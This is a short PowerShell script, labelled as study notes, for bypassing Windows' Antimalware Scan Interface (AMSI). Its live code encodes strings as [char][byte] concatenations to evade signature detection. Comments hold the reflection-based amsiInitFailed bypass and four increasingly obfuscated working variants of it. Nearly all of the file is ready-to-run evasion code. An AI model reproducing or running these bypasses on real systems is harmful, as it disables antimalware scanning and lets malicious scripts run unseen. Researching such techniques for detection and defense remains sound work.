# Studying about AMSI bypass 
# Below is a quick script to assist in building a script to bypass AMSI
# 

#$transformValue = "SetValue"
#$transformValue = "amsiInitFailed"
$transformValue = "System.Management.Automation.AmsiUtils"
$output = ""
ForEach ($letter in $transformValue.ToCharArray()) {
    # Convert the letters into the decimal number representation of the character
    $dec = [byte][char]$letter
    $output += "[char][byte]" + [string]$dec + "+"
}
$output -replace ".$"

# Reference: https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/

# Original String
### [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)  ###

# amsi bypass #1
#$t = [Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiInitFailed','NonPublic,Static')
#$t.('SetValu'+'e')($null,$true)

# amsi bypass #2
# Transformed Value - SetValue
# $t = [Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiInitFailed','NonPublic,Static')
# $t.([char][byte]83+[char][byte]101+[char][byte]116+[char][byte]86+[char][byte]97+[char][byte]108+[char][byte]117+[char][byte]101)($null,$true)

# amsi bypass #3
# Transformed Value - amsiInitFailed
#$a = ([char][byte]97+[char][byte]109+[char][byte]115+[char][byte]105+[char][byte]73+[char][byte]110+[char][byte]105+[char][byte]116+[char][byte]70+[char][byte]97+[char][byte]105+[char][byte]108+[char][byte]101+[char][byte]100)
#$t = [Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField($a,'NonPublic,Static')
#$t.([char][byte]83+[char][byte]101+[char][byte]116+[char][byte]86+[char][byte]97+[char][byte]108+[char][byte]117+[char][byte]101)($null,$true)

# amsi bypass #4
# Transformed Value - 'System.Management.Automation.AmsiUtils'
#$a = ([char][byte]97+[char][byte]109+[char][byte]115+[char][byte]105+[char][byte]73+[char][byte]110+[char][byte]105+[char][byte]116+[char][byte]70+[char][byte]97+[char][byte]105+[char][byte]108+[char][byte]101+[char][byte]100)
#$b = ([char][byte]83+[char][byte]121+[char][byte]115+[char][byte]116+[char][byte]101+[char][byte]109+[char][byte]46+[char][byte]77+[char][byte]97+[char][byte]110+[char][byte]97+[char][byte]103+[char][byte]101+[char][byte]109+[char][byte]101+[char][byte]110+[char][byte]116+[char][byte]46+[char][byte]65+[char][byte]117+[char][byte]116+[char][byte]111+[char][byte]109+[char][byte]97+[char][byte]116+[char][byte]105+[char][byte]111+[char][byte]110+[char][byte]46+[char][byte]65+[char][byte]109+[char][byte]115+[char][byte]105+[char][byte]85+[char][byte]116+[char][byte]105+[char][byte]108+[char][byte]115)
#$t = [Ref].Assembly.GetType($b).GetField($a,'NonPublic,Static')
#$t.([char][byte]83+[char][byte]101+[char][byte]116+[char][byte]86+[char][byte]97+[char][byte]108+[char][byte]117+[char][byte]101)($null,$true)
